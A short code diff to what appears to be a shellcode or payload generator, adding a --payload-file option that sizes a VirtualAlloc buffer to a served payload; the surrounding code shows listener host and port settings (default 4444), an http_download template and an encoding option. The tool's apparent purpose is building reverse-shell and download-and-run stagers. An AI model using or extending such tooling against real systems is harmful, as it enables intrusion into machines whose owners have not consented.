@@ -1208,6 +1208,9 @@ def main() -> None:
     parser.add_argument("--src", default=None)
     parser.add_argument("--dst", default=None)
     parser.add_argument("--url", default=None, help="URL for http_download template")
+    parser.add_argument("--payload-file", default=None, metavar="PATH",
+                        help="Local file being served; sets VirtualAlloc size "
+                             "to match (rounded up to page boundary)")
     parser.add_argument("--no-assemble", action="store_true")
     parser.add_argument(
         "--encode", action="store_true",
@@ -1232,6 +1235,17 @@ def main() -> None:
     if lport is None:
         lport = 4444
 
+    alloc_size = None
+    if args.payload_file is not None:
+        import os
+        fsize = os.path.getsize(args.payload_file)
+        page = 0x1000
+        alloc_size = ((fsize + page - 1) // page) * page
+        if alloc_size == 0:
+            alloc_size = page
+        print(f"[+] Payload file: {args.payload_file} ({fsize} bytes)")
+        print(f"[+] Alloc size:   0x{alloc_size:x} ({alloc_size} bytes)")
+
     config = TemplateConfig(
         lhost=lhost,
         lport=lport,
@@ -1239,6 +1253,7 @@ def main() -> None:
         src_path=args.src,
         dst_path=args.dst,
         url=args.url,
+        alloc_size=alloc_size,
     )
 
     result = build(
